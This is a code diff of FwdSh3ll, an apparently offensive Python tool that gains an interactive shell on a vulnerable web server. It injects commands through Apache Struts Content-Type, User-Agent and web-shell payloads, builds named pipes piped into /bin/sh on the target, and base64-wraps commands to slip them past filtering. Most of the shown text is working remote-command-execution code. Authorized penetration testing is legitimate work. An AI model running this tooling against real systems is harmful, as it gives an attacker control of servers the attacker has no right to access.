@@ -21,79 +21,46 @@ damage caused by this tool.
 @enddisclaimer
 """
 
-# Usage: python3 FwdSh3ll.py [-h]
-
-import requests
 import threading
 import random
 import string
 import re
-import sys
 
-from termcolor import colored, cprint
+import requests
+
 from importlib import import_module
 from base64 import b64encode
 from time import sleep
 from os import listdir
 
-VERSION = '0.1'
-AUTHOR = 'by snovvcrash'
-SITE = 'https://github.com/snovvcrash/FwdSh3ll'
+from termcolor import colored, cprint
 
-VERSION_FORMATTED = '{' + colored('v' + VERSION, 'blue', attrs=['bold']) + '}'
-AUTHOR_FORMATTED = colored(AUTHOR, attrs=['dark'])
-SITE_FORMATTED = colored(SITE, attrs=['underline', 'dark'])
+from core.updater import updater
+from core.cliopts import cliOptions
+from core.common import BANNER
 
-BANNER = f'''\033[1;32m
-  █████▒█     █░▓█████▄   ██████  ██░ ██ ▓█████  ██▓     ██▓    
-▓██   ▒▓█░ █ ░█░▒██▀ ██▌▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
-▒████ ░▒█░ █ ░█ ░██   █▌░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
-░▓█▒  ░░█░ █ ░█ ░▓█▄   ▌  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
-░▒█░   ░░██▒██▓ ░▒████▓ ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
- ▒ ░   ░ ▓░▒ ▒   ▒▒▓  ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
- ░       ▒ ░ ░   ░ ▒  ▒ ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
- ░ ░     ░   ░   ░ ░  ░ ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
-           ░       ░          ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
-                 ░                                              
-                 \033[0m
-{VERSION_FORMATTED}
-{AUTHOR_FORMATTED}
-{SITE_FORMATTED}
-'''
-
-HELP = '''\
-python3 FwdSh3ll.py [-h]
-
-* Target URL:
-    Specify the vulnerable URL to attack.
-* Proxy URL (optional):
-    Specify proxy if needed.
-* Payload:
-    Choose required payload from the list.
-* Mode (single command vs forward shell):
-    Choose required action.
-'''
-
-
-PATH = '/tmp'
+INPUT = 'fwdshin'
+OUTPUT = 'fwdshout'
 
 
 class ForwardShell:
-	def __init__(self, url, proxy, payloadName, genPayload, interval=1.3):
+	def __init__(self, url, proxy, payloadName, genPayload, pipesPath, useBase64, interval=1.3):
 		self._url = url
 		self._proxy = proxy
 		self._payloadName = payloadName
 		self._genPayload = genPayload
+		self._useBase64 = useBase64
 		self._interval = interval
+		self._delim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
 		self._session = random.randrange(10000, 99999)
-		self._stdin = f'{PATH}/fwdshin.{self._session}'
-		self._stdout = f'{PATH}/fwdshout.{self._session}'
+		self._stdin = f'{pipesPath}/{INPUT}.{self._session}'
+		self._stdout = f'{pipesPath}/{OUTPUT}.{self._session}'
 		cprint(f'[*] Session ID: {self._session}', 'green')
 
 		cprint('[*] Setting up forward shell on target', 'green')
 		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh >& {self._stdout}'
-		ForwardShell.runRawCmd(createNamedPipes, self._url, self._proxy, self._payloadName, self._genPayload, timeout=0.5)
+		ForwardShell.runRawCmd(createNamedPipes, self._url, self._proxy, self._payloadName, self._genPayload, timeout=0.5, firstConnect=True)
 
 		cprint('[*] Setting up read thread', 'green')
 		self._lock = threading.Lock()
@@ -105,17 +72,28 @@ class ForwardShell:
 
 	def _readCmd(self):
 		getOutput = f'/bin/cat {self._stdout}'
+
 		while True:
 			result = ForwardShell.runRawCmd(getOutput, self._url, self._proxy, self._payloadName, self._genPayload)
+
 			if result:
+				try:
+					result = re.search(rf'{self._delim}(.*?){self._delim}', result, re.DOTALL).group(1)
+				except AttributeError:
+					pass
+				else:
+					result = result.lstrip()
+
 				with self._lock:
 					print(result)
+
 				clearOutput = f'echo -n "" > {self._stdout}'
 				ForwardShell.runRawCmd(clearOutput, self._url, self._proxy, self._payloadName, self._genPayload)
+
 			sleep(self._interval)
 
 	@staticmethod
-	def runRawCmd(cmd, url, proxy, payloadName, genPayload, timeout=50):
+	def runRawCmd(cmd, url, proxy, payloadName, genPayload, timeout=50, firstConnect=False):
 		if payloadName == 'ApacheStruts':
 			payload = genPayload(cmd)
 			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
@@ -123,51 +101,63 @@ class ForwardShell:
 			payload = genPayload(cmd)
 			headers = {'User-Agent': payload}
 		elif payloadName == 'WebShell':
-			delim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-			url += f'echo {delim};' + cmd + f';echo {delim}'
+			url += cmd
 			headers = {'User-Agent': 'Mozilla/5.0'}
 
-		page = b''
-		try:
-			with requests.get(
-				url,
-				headers=headers,
-				proxies=proxy,
-				timeout=timeout,
-				verify=False,
-				allow_redirects=False,
-				stream=True
-			) as resp:
-				for i in resp.iter_content():
-					page += i
-
-		except requests.exceptions.ChunkedEncodingError as e:
-			pass
-
-		except requests.exceptions.ReadTimeout:
-			return None
-
-		except Exception as e:
-			cprint(f'[!] Exception caught: {str(e)}', 'yellow')
-			return None
-
-		page = page.decode('utf-8')
-
-		if payloadName == 'WebShell':
+		while True:
+			page = b''
 			try:
-				page = re.search(rf'{delim}(.*?){delim}', page, re.DOTALL).group(1)
-			except AttributeError:
+				with requests.get(
+					url,
+					headers=headers,
+					proxies=proxy,
+					timeout=timeout,
+					verify=False,
+					allow_redirects=False,
+					stream=True
+				) as resp:
+					for i in resp.iter_content():
+						page += i
+				break
+
+			except requests.exceptions.ChunkedEncodingError as e:
+				break
+
+			except requests.exceptions.ReadTimeout:
 				return None
 
-		return page
+			except requests.packages.urllib3.exceptions.ConnectTimeoutError:
+				cprint('[!] Connection timeout error, retrying', 'yellow')
+				if firstConnect:
+					firstConnect = False
+					continue
+				cprint('[-] Connection timeout error', 'red')
+				return None
+
+			except Exception as e:
+				print(payload)
+				cprint(f'[!] Exception caught: {str(e)}', 'red')
+				return None
+
+		return page.decode('utf-8')
 
 	def writeCmd(self, cmd, namedPipes=True):
-		b64Cmd = b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
 		if namedPipes:
-			unwrapAndExec = f'echo {b64Cmd} | base64 -d > {self._stdin}'
+			cmd = f'echo {self._delim};' + cmd + f';echo {self._delim}\n'
+			if self._useBase64:
+				cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
+				cmd = f'echo {cmd} | base64 -d > {self._stdin}'
+			else:
+				cmd = f'echo {cmd} > {self._stdin}'
 		else:
-			unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh > /dev/null'
-		ForwardShell.runRawCmd(unwrapAndExec, self._url, self._proxy, self._payloadName, self._genPayload)
+			cmd = f'{cmd}\n'
+			if self._useBase64:
+				cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
+				cmd = f'echo {cmd} | base64 -d | /bin/sh > /dev/null'
+			else:
+				cmd = f'echo {cmd} | /bin/sh > /dev/null'
+
+		ForwardShell.runRawCmd(cmd, self._url, self._proxy, self._payloadName, self._genPayload)
 		sleep(self._interval * 1.2)
 
 	def upgradeToPty(self):
@@ -175,41 +165,13 @@ class ForwardShell:
 		self.writeCmd(upgradeShell, namedPipes=False)
 
 
-def updater():
-	numOfPayloads = len([pn for pn in listdir('./payloads') if pn.endswith('.py') and not pn.startswith('_')])
-
-	with open('./FwdSh3ll.conf', 'w', encoding='utf-8') as conf:
-		conf.write('ver=' + VERSION + '\n')
-		conf.write('num_of_payloads=' + str(numOfPayloads) + '\n')
-
-	cprint(f'[*] Loaded {numOfPayloads} payload(s)', 'green')
-
-	try:
-		latestConf = requests.get('https://raw.githubusercontent.com/snovvcrash/FwdSh3ll/master/FwdSh3ll.conf', timeout=10).text
-	except Exception:
-		cprint('[!] Failed to check for updates', 'yellow')
-		return
-
-	ver = re.search(r'^ver=(\d+.\d+)$', latestConf, re.MULTILINE).group(1)
-	num = re.search(r'^num_of_payloads=(\d+)$', latestConf, re.MULTILINE).group(1)
-
-	if ver != VERSION:
-		cprint('[!] New version is available!', 'yellow')
-	if int(num) > numOfPayloads:
-		cprint('[!] New payloads are available!', 'yellow')
-
-
 def main():
 	print(BANNER)
 
-	if len(sys.argv) > 1:
-		if len(sys.argv) == 2 and sys.argv[1] == '-h':
-			print(HELP)
-		else:
-			print('Usage: python3 {} [-h]\n'.format(sys.argv[0]))
-		return
+	args = cliOptions()
 
-	updater()
+	allPayloads = [pn[:-3] for pn in sorted(listdir('./payloads')) if pn.endswith('.py') and not pn.startswith('_')]
+	updater(allPayloads)
 
 	print()
 	while True:
@@ -227,7 +189,6 @@ def main():
 
 	print('\n[?] Which payload you would like to use?\n')
 
-	allPayloads = [pn[:-3] for pn in sorted(listdir('./payloads')) if pn.endswith('.py') and not pn.startswith('_')]
 	for i, payloadName in enumerate(allPayloads):
 		print(f'    {i + 1}. {payloadName}')
 
@@ -263,13 +224,15 @@ def main():
 		elif choice == '2':
 			cprint('\n############################## FORWARD SHELL MODE #############################\n', 'red')
 			prompt = colored('FwdSh3ll> ', 'magenta')
-			sh = ForwardShell(url, proxy, payloadName, payloadModule.genPayload)
+			sh = ForwardShell(url, proxy, payloadName, payloadModule.genPayload, args.pipes_path, args.no_base64)
 			print()
 
 			try:
 				while True:
-					cmd = input(prompt).rstrip()
-					if cmd == 'pty':
+					cmd = input(prompt).strip()
+					if not cmd:
+						continue
+					elif cmd == 'pty':
 						prompt = ''
 						sh.upgradeToPty()
 					else:
@@ -278,7 +241,7 @@ def main():
 			except KeyboardInterrupt:
 				cprint('\n\n[*] Terminating shell, cleaning up the mess\n', 'green')
 				del sh
-				b64Cmd = b64encode(f'rm -f {PATH}/fwdshin.* {PATH}/fwdshout.*\n'.encode('utf-8')).decode('utf-8')
+				b64Cmd = b64encode(f'rm -f {args.pipes_path}/{INPUT}.* {args.pipes_path}/{OUTPUT}.*\n'.encode('utf-8')).decode('utf-8')
 				ForwardShell.runRawCmd(f'echo {b64Cmd} | base64 -d | /bin/sh > /dev/null', url, proxy, payloadName, payloadModule.genPayload)
 				break
 
